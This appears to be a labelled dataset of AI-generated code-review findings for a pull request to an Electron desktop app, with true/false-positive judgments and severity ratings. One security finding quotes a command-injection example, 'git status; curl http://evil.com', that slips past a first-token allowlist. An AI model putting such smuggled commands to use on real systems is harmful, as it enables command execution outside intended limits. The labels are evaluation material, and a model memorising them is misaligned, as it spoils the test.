@@ -1,0 +1,431 @@
+{
+  "pr_key": "LegionIO_legion-interlink_16-c3dafce0",
+  "pr": {
+    "repo": "https://github.com/LegionIO/legion-interlink",
+    "pr_number": 16,
+    "base": "1e2def3dff2262e93fefd56d955465bd2f208992",
+    "head": "c3dafce0a1545b4aa233bc1f3d2aaa3cd31eb8b5"
+  },
+  "findings": [
+    {
+      "file": "electron/tools/superpowers-bootstrap.ts",
+      "start_line": 61,
+      "end_line": 77,
+      "message": "bootstrapSuperpowers() calls execFileSync (synchronous) with a 30-second timeout for the git clone. It is invoked from ensureAppHome() in the app.whenReady() handler, which runs before createWindow() (main.ts line 687). On first launch, the Electron window will not appear for up to 30 seconds while the clone is in progress, making the app appear frozen. The fix is to run the bootstrap asynchronously using execFile with a callback or spawn, or to call it after createWindow().",
+      "tp_fp": "tp",
+      "severity": "medium",
+      "category": "reliability",
+      "scope": "introduced-by-pr",
+      "difficulty": "easy",
+      "context_required": "diff-plus-related-files",
+      "tp_fp_justification": "Verified: ensureAppHome() (which calls bootstrapSuperpowers synchronously via execFileSync with 30s timeout) is called at line 340 of main.ts before createWindow() at line 687, both inside app.whenReady().then(). On first launch this blocks window creation for the full clone duration.",
+      "severity_justification": "Affects only first launch and only when git is available, but the app will appear frozen/unresponsive for up to 30 seconds — a significant UX regression for a desktop application.",
+      "category_justification": "Blocking the main process event loop before window creation causes the app to appear frozen, which is an operational reliability concern for the desktop application.",
+      "producer": "llm_review:claude-sonnet-4.6",
+      "source": {
+        "type": "llm_review",
+        "alignment": "generated"
+      }
+    },
+    {
+      "file": "electron/tools/cli-tools.ts",
+      "start_line": 41,
+      "end_line": 44,
+      "message": "The firstToken check only validates the first whitespace-separated token of the command string. Because runCommandWithStreaming passes the entire command to spawn() with shell: true (process-runner.ts line 220), shell metacharacters allow bypassing the restriction entirely. For example, 'git status; curl http://evil.com' has firstToken='git' (passes check) but the shell executes both commands. This provides a false sense of restriction — the CLI tools have no more containment than the unrestricted 'sh' tool.",
+      "tp_fp": "tp",
+      "severity": "medium",
+      "category": "security",
+      "scope": "introduced-by-pr",
+      "difficulty": "medium",
+      "context_required": "diff-plus-related-files",
+      "tp_fp_justification": "Confirmed: process-runner.ts uses spawn(command, { shell: true }), so shell metacharacters bypass the firstToken binary validation in cli-tools.ts. A command like 'git status; curl http://evil.com' passes the check but executes both. The CLI tools offer no meaningful additional containment over the general sh tool.",
+      "severity_justification": "The false restriction could cause users/operators to believe CLI tools are more narrowly scoped than they are, but the actual attack surface is limited since this is a local desktop app where the user controls the AI. The real harm is the false sense of security, not immediate exploitability.",
+      "category_justification": "The firstToken check is a security guard that can be bypassed via shell metacharacters, creating a false sense of containment.",
+      "producer": "llm_review:claude-sonnet-4.6",
+      "source": {
+        "type": "llm_review",
+        "alignment": "generated"
+      }
+    },
+    {
+      "file": "electron/tools/cli-tools.ts",
+      "start_line": 115,
+      "end_line": 120,
+      "message": "The jq tool description gives examples like 'echo {\"a\":1} | jq .a' and 'cat file.json | jq ...' that start with 'echo' and 'cat'. The tool's own validation checks that firstToken is in allBinaries (['jq']), so both examples would immediately fail with 'Command must start with one of: jq'. The advertised usage patterns are completely broken — common jq invocations via stdin piping from other programs cannot be expressed.",
+      "tp_fp": "tp",
+      "severity": "medium",
+      "category": "correctness",
+      "scope": "introduced-by-pr",
+      "difficulty": "easy",
+      "context_required": "diff-only",
+      "tp_fp_justification": "Verified in code: the jq spec has binary:'jq' with no extraBinaries, so allBinaries=['jq']. The firstToken check rejects any command not starting with 'jq'. Two of the three description examples ('echo ...' and 'cat ...') would immediately fail validation with 'Command must start with one of: jq', making the advertised piping patterns non-functional.",
+      "severity_justification": "The jq tool's primary use case (piping JSON data from other commands) is advertised but broken by the tool's own validation. Users/AI following the examples will get error responses. Only file-based invocations like 'jq -r .version package.json' work as intended.",
+      "category_justification": "The tool's input validation contradicts the usage examples in its own description, causing documented functionality to fail at runtime.",
+      "producer": "llm_review:claude-sonnet-4.6",
+      "source": {
+        "type": "llm_review",
+        "alignment": "generated"
+      }
+    },
+    {
+      "file": "electron/tools/cli-tools.ts",
+      "start_line": 167,
+      "end_line": 173,
+      "message": "buildCliTools only checks binaryExists(spec.binary) for tool registration, but tools with extraBinaries accept commands for those binaries too. For the 'github' tool (binary: 'gh', extraBinaries: ['git']), if gh is installed but git is not, git commands are accepted and dispatched but will fail at OS level with no clear message. For 'python' (binary: 'python3', extraBinaries: ['pip3']), pip3 presence is never verified. Each extra binary should be checked independently.",
+      "tp_fp": "tp",
+      "severity": "low",
+      "category": "correctness",
+      "scope": "introduced-by-pr",
+      "difficulty": "easy",
+      "context_required": "diff-only",
+      "tp_fp_justification": "Verified: buildCliTools only checks binaryExists(spec.binary), never extraBinaries. For 'github' (gh+git) and 'python' (python3+pip3), the tool registers and accepts commands for unchecked binaries that may be absent, dispatching them to the shell where they fail with OS-level errors rather than a clean upfront validation message.",
+      "severity_justification": "The failure mode is the shell returning 'command not found' via stderr — this is visible and not silent. On macOS (the target), git is virtually always co-installed with gh. The concern is real but unlikely to manifest in practice and gracefully degrades with a legible error.",
+      "category_justification": "The tool registration logic is inconsistent with what commands it accepts — it registers based on primary binary but allows commands for unverified extra binaries.",
+      "producer": "llm_review:claude-sonnet-4.6",
+      "source": {
+        "type": "llm_review",
+        "alignment": "generated"
+      }
+    },
+    {
+      "file": "electron/tools/superpowers-bootstrap.ts",
+      "start_line": 121,
+      "end_line": 150,
+      "message": "updateSuperpowers is exported but never imported or called anywhere in the codebase (confirmed by grep). As a result, skill.json wrappers generated on first bootstrap are never regenerated even after git pull updates the upstream repo. New skills added to the repo after initial clone are also never picked up. The function is dead code.",
+      "tp_fp": "tp",
+      "severity": "low",
+      "category": "maintainability",
+      "scope": "introduced-by-pr",
+      "difficulty": "easy",
+      "context_required": "diff-plus-related-files",
+      "tp_fp_justification": "Grep confirms updateSuperpowers is defined but never imported or called anywhere in the codebase. It is dead code. Consequently, the superpowers repo is never updated after initial clone and new/changed skills are never picked up.",
+      "severity_justification": "The app still functions — bootstrap works on first launch. The missing update path means skills can become stale over time, but this is a feature gap rather than a breakage. Users can manually delete and re-clone. Low severity but worth noting.",
+      "category_justification": "Exported dead code that was intended to provide update functionality but is never wired up — a code quality and completeness issue.",
+      "producer": "llm_review:claude-sonnet-4.6",
+      "source": {
+        "type": "llm_review",
+        "alignment": "generated"
+      }
+    },
+    {
+      "file": "electron/tools/cli-tools.ts",
+      "start_line": 57,
+      "end_line": 57,
+      "message": "timeoutMs: timeout || config.tools.shell.timeout treats timeout=0 as falsy, silently substituting the config default instead of using 0. If a caller deliberately passes 0 to mean 'no timeout' or 'immediate', the intent is silently discarded. The correct guard is timeout !== undefined ? timeout : config.tools.shell.timeout.",
+      "tp_fp": "fp",
+      "severity": "low",
+      "category": "correctness",
+      "scope": "introduced-by-pr",
+      "difficulty": "easy",
+      "context_required": "diff-plus-related-files",
+      "tp_fp_justification": "While the || pattern is technically falsy-based, the 'no timeout' semantic for 0 doesn't exist in this codebase: process-runner.ts clamps timeoutMs to Math.max(1, timeoutMs), making 0 an immediate 1ms timeout rather than 'no timeout'. Additionally, the exact same pattern exists pre-existing in shell.ts line 58, so cli-tools.ts is consistent with established codebase conventions. The real-world impact is nil.",
+      "severity_justification": "Even if the pattern were changed, no caller passes 0 meaningfully, and the runner would clamp it anyway. Negligible practical impact.",
+      "category_justification": "The finding is about a potential logical error in conditional evaluation.",
+      "producer": "llm_review:claude-sonnet-4.6",
+      "source": {
+        "type": "llm_review",
+        "alignment": "generated"
+      }
+    },
+    {
+      "file": "electron/tools/superpowers-bootstrap.ts",
+      "start_line": 47,
+      "end_line": 57,
+      "message": "The promptTemplate in generated skill.json files is taken verbatim from the body of SKILL.md in the cloned external repo with no sanitization or integrity verification. A compromised upstream repo (obra/superpowers) would silently install malicious prompt content into the user's skill set on first launch. There is no hash pinning, tag pinning, or content validation — only --depth 1 on HEAD of the default branch.",
+      "tp_fp": "fp",
+      "severity": "medium",
+      "category": "security",
+      "scope": "introduced-by-pr",
+      "difficulty": "hard",
+      "context_required": "broader-project-context",
+      "tp_fp_justification": "The finding is factually correct about the code — SKILL.md content is cloned from HEAD without hash/tag pinning and written verbatim as promptTemplate. However, this is a generic software supply chain advisory (pin your dependencies) that applies to any package manager, git submodule, or external content fetch. It does not demonstrate a concrete exploitable vulnerability specific to this codebase — it merely asserts the general risk class exists. Prompt injection via a compromised upstream repo is a theoretical risk but the finding provides no evidence of actual compromise or a specific exploit path beyond the general supply chain concern.",
+      "severity_justification": "Supply chain risk from an unpinned external repo is a real concern in principle, but classifying as medium because: skills only inject prompt content (not execute arbitrary code directly), the upstream is a named public repo from a known author, and the risk requires an active compromise of that repo.",
+      "category_justification": "Concerns an untrusted external content source being incorporated into the application without integrity verification.",
+      "producer": "llm_review:claude-sonnet-4.6",
+      "source": {
+        "type": "llm_review",
+        "alignment": "generated"
+      }
+    },
+    {
+      "file": "electron/tools/cli-tools.ts",
+      "start_line": 9,
+      "end_line": 14,
+      "message": "binaryExists calls spawnSync (blocking) once per tool spec; with 9 specs this makes 9 synchronous child process spawns inside buildCliTools, which is itself called from the async buildToolRegistry. On non-Windows it invokes 'command -v <name>' via shell: true, spawning a shell process each time. These synchronous calls block the Node.js event loop, delaying IPC responsiveness and tool registration while the main process is also handling window setup and other events.",
+      "tp_fp": "tp",
+      "severity": "low",
+      "category": "performance",
+      "scope": "introduced-by-pr",
+      "difficulty": "easy",
+      "context_required": "diff-plus-related-files",
+      "tp_fp_justification": "Verified: binaryExists uses spawnSync with shell:true, called 9 times synchronously inside buildCliTools, which is invoked inside the async buildToolRegistry. The event loop is blocked for the duration. The factual claim is correct.",
+      "severity_justification": "Each 'command -v' invocation on a local filesystem completes in ~1-5ms; 9 calls totals ~10-50ms of event loop blocking — practically imperceptible for a desktop app. The concern is technically valid but the real-world impact is negligible.",
+      "category_justification": "Synchronous child process spawning blocks the Node.js event loop, a performance concern even if minor in this case.",
+      "producer": "llm_review:claude-sonnet-4.6",
+      "source": {
+        "type": "llm_review",
+        "alignment": "generated"
+      }
+    },
+    {
+      "file": "electron/tools/cli-tools.ts",
+      "start_line": 39,
+      "end_line": 39,
+      "message": "The `input` object is cast to a more specific type using `as { command: string; cwd?: string; timeout?: number }`. This bypasses Zod's type inference and validation. A safer approach is to use `inputSchema.parse(input)` to get a typed object, which also ensures the input conforms to the schema at runtime. Since `execute` receives `unknown`, parsing is the correct way to validate and type the input.",
+      "tp_fp": "fp",
+      "severity": "low",
+      "category": "maintainability",
+      "scope": "pre-existing",
+      "difficulty": "easy",
+      "context_required": "diff-plus-related-files",
+      "tp_fp_justification": "The 'input as {...}' type cast is the universal convention across all tool files in the codebase (verified in shell.ts, file-read.ts, file-write.ts, config-manage.ts, etc.). The cli-tools.ts implementation is consistent with established patterns. The finding applies a general best practice without recognizing the codebase convention, and the Mastra framework validates input against the Zod inputSchema before calling execute.",
+      "severity_justification": "Even if the concern were valid, the framework validates input against the Zod schema prior to execute() being called, so the type assertion is not a runtime safety gap.",
+      "category_justification": "The finding is about type-safety idioms and code style.",
+      "producer": "llm_review:gemini-2.5-pro",
+      "source": {
+        "type": "llm_review",
+        "alignment": "generated"
+      }
+    },
+    {
+      "file": "electron/tools/cli-tools.ts",
+      "start_line": 61,
+      "end_line": 61,
+      "message": "The `HOME` environment variable is used as a fallback for the current working directory, but `HOME` may not be set in all environments, especially on Windows where `USERPROFILE` is more common. A more reliable cross-platform approach is to use `os.homedir()` from the `node:os` module.",
+      "tp_fp": "fp",
+      "severity": "low",
+      "category": "correctness",
+      "scope": "pre-existing",
+      "difficulty": "easy",
+      "context_required": "diff-plus-related-files",
+      "tp_fp_justification": "The app is macOS-only (electron-builder.yml only targets mac/dmg). The identical pattern 'cwd || context.cwd || process.env.HOME' already exists in the pre-existing shell.ts at line 57. On macOS, HOME is always set. The Windows USERPROFILE concern is inapplicable to this project.",
+      "severity_justification": "Even if cross-platform were a concern, this would only affect fallback cwd, and the impact would be minimal.",
+      "category_justification": "The finding is about cross-platform environment variable availability.",
+      "producer": "llm_review:gemini-2.5-pro",
+      "source": {
+        "type": "llm_review",
+        "alignment": "generated"
+      }
+    },
+    {
+      "file": "electron/tools/superpowers-bootstrap.ts",
+      "start_line": 140,
+      "end_line": 144,
+      "message": "The `updateSuperpowers` function synchronously executes `git pull`, blocking the main thread. This can cause the application to become unresponsive. An asynchronous alternative like `execFile` should be used instead.",
+      "tp_fp": "fp",
+      "severity": "low",
+      "category": "reliability",
+      "scope": "introduced-by-pr",
+      "difficulty": "easy",
+      "context_required": "diff-plus-related-files",
+      "tp_fp_justification": "While the claim that execFileSync blocks the main thread is technically correct, updateSuperpowers is dead code — it is exported but never imported or called anywhere in the codebase (confirmed in finding 5 / grep verification). A blocking call in never-executed code has zero runtime impact. The finding is factually correct about the code but irrelevant since the function is unreachable.",
+      "severity_justification": "The function is never called, so there is no actual blocking behavior to mitigate. If it were wired up, the concern would be medium severity (similar to finding 1 about bootstrapSuperpowers).",
+      "category_justification": "Synchronous blocking in the main process is a reliability/responsiveness concern.",
+      "producer": "llm_review:gemini-2.5-pro",
+      "source": {
+        "type": "llm_review",
+        "alignment": "generated"
+      }
+    },
+    {
+      "file": "electron/tools/superpowers-bootstrap.ts",
+      "start_line": 113,
+      "end_line": 118,
+      "message": "The code uses `statSync` inside a loop, which performs synchronous I/O and can block the main thread, especially if the number of entries in `repoSkillsDir` is large. An asynchronous version, `fs.promises.stat`, should be used with `for...of` and `await` to avoid blocking while still processing sequentially.",
+      "tp_fp": "fp",
+      "severity": "low",
+      "category": "performance",
+      "scope": "introduced-by-pr",
+      "difficulty": "easy",
+      "context_required": "diff-only",
+      "tp_fp_justification": "The finding isolates one sync call (statSync) from a function that is synchronous throughout — readdirSync, mkdirSync, readFileSync, writeFileSync, execFileSync are all sync in the same function. Replacing only statSync would be an inconsistent half-measure. The real blocking concern is execFileSync for git clone (finding 1), not a few statSync calls over a small bounded set of skill directories. This is generic advice applied without recognizing context.",
+      "severity_justification": "statSync over a small number of local filesystem entries (a bounded skill directory) completes in microseconds — negligible practical impact compared to the execFileSync git clone.",
+      "category_justification": "Synchronous I/O blocking the event loop is a performance concern.",
+      "producer": "llm_review:gemini-2.5-pro",
+      "source": {
+        "type": "llm_review",
+        "alignment": "generated"
+      }
+    },
+    {
+      "file": "electron/tools/superpowers-bootstrap.ts",
+      "start_line": 100,
+      "end_line": 111,
+      "message": "The function generateSkillJson overwrites the skill.json file with a new template whenever the SKILL.md file is updated. However, there is no mechanism to notify users about the overwrite risk or backup their changes, which could result in data loss if they've modified skill.json manually.",
+      "tp_fp": "fp",
+      "severity": "low",
+      "category": "correctness",
+      "scope": "introduced-by-pr",
+      "difficulty": "easy",
+      "context_required": "diff-only",
+      "tp_fp_justification": "The finding is factually incorrect about the code. generateSkillJson explicitly checks 'if (existsSync(skillJsonPath)) return false' at line 42 — it deliberately never overwrites an existing skill.json. The comment even says 'Don't overwrite if skill.json already exists (user may have customized)'. The premise of the finding is wrong.",
+      "severity_justification": "The concern is moot since the code already guards against overwriting existing files.",
+      "category_justification": "The finding makes an incorrect factual claim about the code's behavior.",
+      "producer": "llm_review:gpt-4o",
+      "source": {
+        "type": "llm_review",
+        "alignment": "generated"
+      }
+    },
+    {
+      "file": "electron/tools/superpowers-bootstrap.ts",
+      "start_line": 119,
+      "end_line": 141,
+      "message": "The implementation of bootstrapSuperpowers assumes the 'skills/' directory structure in the cloned repository. If the repository changes its structure or doesn't contain a 'skills/' directory, the function will fail silently after logging a warning, leaving the app in an inconsistent state.",
+      "tp_fp": "fp",
+      "severity": "low",
+      "category": "reliability",
+      "scope": "introduced-by-pr",
+      "difficulty": "easy",
+      "context_required": "diff-only",
+      "tp_fp_justification": "The code explicitly handles a missing 'skills/' directory with a console.warn and clean return — not a silent failure. The 'inconsistent state' claim is unsupported: if skills/ is absent, the app has no superpowers skills but is otherwise fully functional. The entire bootstrap is wrapped in try/catch in main.ts as a non-fatal operation. This is graceful degradation, not an inconsistency.",
+      "severity_justification": "The code already handles this scenario with a warning and clean exit. No state corruption or app breakage occurs.",
+      "category_justification": "The finding concerns error handling and graceful degradation of the bootstrap operation.",
+      "producer": "llm_review:gpt-4o",
+      "source": {
+        "type": "llm_review",
+        "alignment": "generated"
+      }
+    },
+    {
+      "file": "electron/main.ts",
+      "start_line": 70,
+      "end_line": 76,
+      "message": "The error handling around bootstrapSuperpowers is non-fatal, but there is no differentiation between recoverable errors like network issues and critical faults like persistent file permission errors, which may repeatedly fail and create noise in logs.",
+      "tp_fp": "fp",
+      "severity": "low",
+      "category": "reliability",
+      "scope": "introduced-by-pr",
+      "difficulty": "easy",
+      "context_required": "diff-only",
+      "tp_fp_justification": "The finding is generic — it restates the general principle 'differentiate error types in catch blocks' without demonstrating specific harm. The actual 'noise' is at most one console.warn per app launch on persistent failure. The suggestion is non-specific and could be copy-pasted onto any try/catch block. No concrete bug, data loss, or behavioral issue is identified.",
+      "severity_justification": "One warning log per launch on persistent failure is negligible noise. No functional impact beyond log verbosity.",
+      "category_justification": "Concerns error handling granularity and operational log noise.",
+      "producer": "llm_review:gpt-4o",
+      "source": {
+        "type": "llm_review",
+        "alignment": "generated"
+      }
+    },
+    {
+      "file": "electron/main.ts",
+      "start_line": 72,
+      "end_line": 77,
+      "message": "Calling `bootstrapSuperpowers` from `ensureAppHome` runs a synchronous `git clone` on the Electron main process during startup. With a 30-second timeout, a slow or unavailable network on first launch will block the UI from appearing for up to 30 seconds (and `git pull` in `updateSuperpowers`, if wired up later, would block for another 15 seconds). Consider deferring this to a background task that runs after the main window is shown, e.g. via `setImmediate`/`queueMicrotask` plus an async child process, or moving it into a worker, so app startup is never gated on network I/O.",
+      "tp_fp": "tp",
+      "severity": "medium",
+      "category": "reliability",
+      "scope": "introduced-by-pr",
+      "difficulty": "easy",
+      "context_required": "diff-plus-related-files",
+      "tp_fp_justification": "Verified: `ensureAppHome()` is called synchronously before `createWindow()` inside `app.whenReady().then()`. `bootstrapSuperpowers` uses `execFileSync('git', ['clone', ...], { timeout: 30000 })` — a blocking syscall. The window cannot be created until this returns, meaning a slow or unavailable network on first launch blocks the UI for up to 30 seconds.",
+      "severity_justification": "On first launch with a slow/absent network connection the app UI is blocked for up to 30 seconds. Not a data-loss or security issue, but significantly degrades the user-visible startup experience.",
+      "category_justification": "A synchronous blocking network operation on the main process during startup is an operational/reliability concern — the app becomes unresponsive to the user rather than failing gracefully.",
+      "producer": "ccr:claude-opus-4.7[ReasoningEffort=medium]",
+      "source": {
+        "type": "ccr",
+        "alignment": "generated"
+      }
+    },
+    {
+      "file": "electron/tools/superpowers-bootstrap.ts",
+      "start_line": 47,
+      "end_line": 58,
+      "message": "The generated skill.json uses `frontmatter.name || skillName` as `manifest.name`, where `skillName` is `superpowers-${entry}`. The skill loader filters by `manifest.name` against `config.skills.enabled` (skill-loader.ts:505). Two consequences:\n\n1. As soon as the user enables any single skill via the UI, every superpowers skill stops loading, because they were never added to `config.skills.enabled` (the filter switches from \"load all\" to \"only listed\"). This makes the auto-bootstrapped skills behave inconsistently with user expectations.\n2. If a `SKILL.md` frontmatter `name` collides across skill folders (e.g. two skills both named `brainstorming`), only one wrapper directory's loaded skill will win and the tool name will collide.\n\nConsider always using `superpowers-${entry}` as the manifest `name` (independent of frontmatter), and/or auto-appending these names to `config.skills.enabled` on bootstrap so behavior is predictable.",
+      "tp_fp": "tp",
+      "severity": "medium",
+      "category": "correctness",
+      "scope": "introduced-by-pr",
+      "difficulty": "medium",
+      "context_required": "diff-plus-related-files",
+      "tp_fp_justification": "Verified: `loadSkillsAsTools` checks `if (enabledSkills.length > 0 && !enabledSkills.includes(manifest.name)) continue`. The bootstrap generates `skill.json` with `name: frontmatter.name || skillName` but never adds these names to `config.skills.enabled`. Once the user enables any skill via the UI, `enabledSkills.length > 0` and the superpowers skills silently stop loading since they're not in the list. The name-collision risk from frontmatter names is also real but secondary.",
+      "severity_justification": "Bootstrapped skills silently stop functioning the moment a user enables any other skill — a counter-intuitive behavior that will confuse users and make the feature appear broken after normal UI interaction.",
+      "category_justification": "The bootstrap creates skills that work only in a specific initial state and break under normal user behavior — this is a logic/correctness issue with how the auto-registered skills interact with the enabled-skills filter.",
+      "producer": "ccr:claude-opus-4.7[ReasoningEffort=medium]",
+      "source": {
+        "type": "ccr",
+        "alignment": "generated"
+      }
+    },
+    {
+      "file": "electron/tools/superpowers-bootstrap.ts",
+      "start_line": 8,
+      "end_line": 28,
+      "message": "`parseSkillMdFrontmatter` is a hand-rolled YAML parser that only handles `key: value` lines. The upstream `obra/superpowers` SKILL.md files commonly use multi-line `description: |` blocks, list syntax, and other YAML features. Multi-line values will be silently truncated to the first line (or worse, subsequent lines will be parsed as malformed keys). Consider either using a real YAML parser (e.g. `js-yaml`, which is likely already in the dependency tree) or restricting acceptance to skills whose frontmatter actually matches this minimal grammar.",
+      "tp_fp": "tp",
+      "severity": "low",
+      "category": "correctness",
+      "scope": "introduced-by-pr",
+      "difficulty": "easy",
+      "context_required": "diff-only",
+      "tp_fp_justification": "Verified: the parser processes lines one-by-one splitting on `:`, so `description: |` yields the literal string `\"|\"` as the value, and subsequent indented lines are silently discarded. The `yaml` package (v2.8.2) is a direct dependency in package.json so there's a readily available fix.",
+      "severity_justification": "When descriptions use block-literal YAML syntax, the generated skill.json will have `description: \"|\"` instead of the actual text. The fallback (`Superpowers skill: <name>`) doesn't apply since the key is present but wrong. This degrades skill descriptions but doesn't break functionality — skills still load and execute. Impact is low unless nombre or name fields are similarly multi-line.",
+      "category_justification": "The parser produces incorrect output (wrong description values) when YAML block literals are used — a correctness issue in the data extraction logic.",
+      "producer": "ccr:claude-opus-4.7[ReasoningEffort=medium]",
+      "source": {
+        "type": "ccr",
+        "alignment": "generated"
+      }
+    },
+    {
+      "file": "electron/main.ts",
+      "start_line": 74,
+      "end_line": 74,
+      "message": "This bootstraps into the hard-coded `APP_HOME/skills`, but skill loading uses `config.skills.directory` (registry.ts:507 and skill-manage.ts:13-16). The default config value is the literal `~/.__BRAND_APP_SLUG/skills` string from ipc/config.ts:112-114 and `readEffectiveConfig` does not expand or rewrite it, so these generated wrappers can be written to a directory the existing loader never scans. Use the same resolved skills directory as the loader before cloning/generating wrappers.",
+      "tp_fp": "tp",
+      "severity": "medium",
+      "category": "correctness",
+      "scope": "introduced-by-pr",
+      "difficulty": "hard",
+      "context_required": "broader-project-context",
+      "tp_fp_justification": "Verified: bootstrap writes to `join(APP_HOME, 'skills')` (fully expanded path), but the skill loader uses `config.skills?.directory` which defaults to the literal `'~/.' + __BRAND_APP_SLUG + '/skills'` string. No `~` expansion exists in the codebase, `existsSync('~/.legionio/skills')` returns false (verified), so `loadSkillsFromDisk` returns `[]` on fresh installs. The bootstrapped skills would silently never be loaded. The `~/` issue in config defaults is pre-existing, but the bootstrap inherits and exacerbates it.",
+      "severity_justification": "On a fresh install, the bootstrapped superpowers skills are generated but never loaded — the feature silently doesn't work. Additionally, any user with a custom `skills.directory` would have the bootstrap write to the wrong place. This is a functional failure of the primary purpose of the bootstrap.",
+      "category_justification": "Bootstrap writes output to a directory the skill loader doesn't scan — the generated wrappers exist on disk but are never read, making the feature non-functional.",
+      "producer": "ccr:gpt-5.5[ReasoningEffort=medium]",
+      "source": {
+        "type": "ccr",
+        "alignment": "generated"
+      }
+    },
+    {
+      "file": "electron/tools/superpowers-bootstrap.ts",
+      "start_line": 64,
+      "end_line": 76,
+      "message": "If `git clone` creates the target directory and then fails or times out, the next launch will skip cloning because `superpowersRoot` exists, then return because `skills/` is missing. That leaves the bootstrap permanently stuck until the user manually deletes the partial directory. Check for a valid clone/skills directory (or remove the partial target on failure) before deciding not to retry.",
+      "tp_fp": "tp",
+      "severity": "medium",
+      "category": "reliability",
+      "scope": "introduced-by-pr",
+      "difficulty": "easy",
+      "context_required": "diff-only",
+      "tp_fp_justification": "Verified from code: git creates the target directory before completing, so a failed/timed-out clone leaves `superpowersRoot` on disk. On next launch `existsSync(superpowersRoot)` is true so cloning is skipped, then `existsSync(repoSkillsDir)` is false causing an early return. The bootstrap is permanently broken until the user manually deletes the partial directory.",
+      "severity_justification": "Users on slow or unreliable networks on first launch (the most likely scenario for a 30-second timeout) would be permanently stuck with no superpowers skills and no clear indication of what to do. Requires manual intervention to recover. Not data-loss or security, but silently breaks a feature across app restarts.",
+      "category_justification": "A failure-recovery/fault-tolerance issue: the code doesn't clean up after a failed operation, leaving persistent state that prevents future retries.",
+      "producer": "ccr:gpt-5.5[ReasoningEffort=medium]",
+      "source": {
+        "type": "ccr",
+        "alignment": "generated"
+      }
+    },
+    {
+      "file": "electron/tools/superpowers-bootstrap.ts",
+      "start_line": 86,
+      "end_line": 87,
+      "message": "This comment says the bootstrap creates a symlink or copy of each skill, but the implementation only creates an empty wrapper directory containing a generated `skill.json`. That mismatch matters because any auxiliary files from the source skill directory will not be available through the wrapper.",
+      "tp_fp": "tp",
+      "severity": "low",
+      "category": "documentation",
+      "scope": "introduced-by-pr",
+      "difficulty": "easy",
+      "context_required": "diff-plus-related-files",
+      "tp_fp_justification": "The comment at lines 84-85 says 'create a symlink or copy' but the code does neither — it only creates an empty wrapper dir with a generated skill.json. The comment is verifiably misleading. However, the claimed consequence (auxiliary files missing) doesn't actually affect the current implementation since all bootstrapped skills use `prompt` execution type, and `runPromptExecution` embeds the full template in skill.json and doesn't use skillDir at all.",
+      "severity_justification": "The stale/misleading comment is the real issue. The stated functional consequence (missing auxiliary files) doesn't apply to the prompt-type skills the bootstrap generates. This is a documentation/comment correctness issue with no current runtime impact.",
+      "category_justification": "The core finding is a stale comment that misrepresents the implementation — the code says 'symlink or copy' but does neither. The functional concern is secondary and currently moot.",
+      "producer": "ccr:gpt-5.5[ReasoningEffort=medium]",
+      "source": {
+        "type": "ccr",
+        "alignment": "generated"
+      }
+    }
+  ]
+}
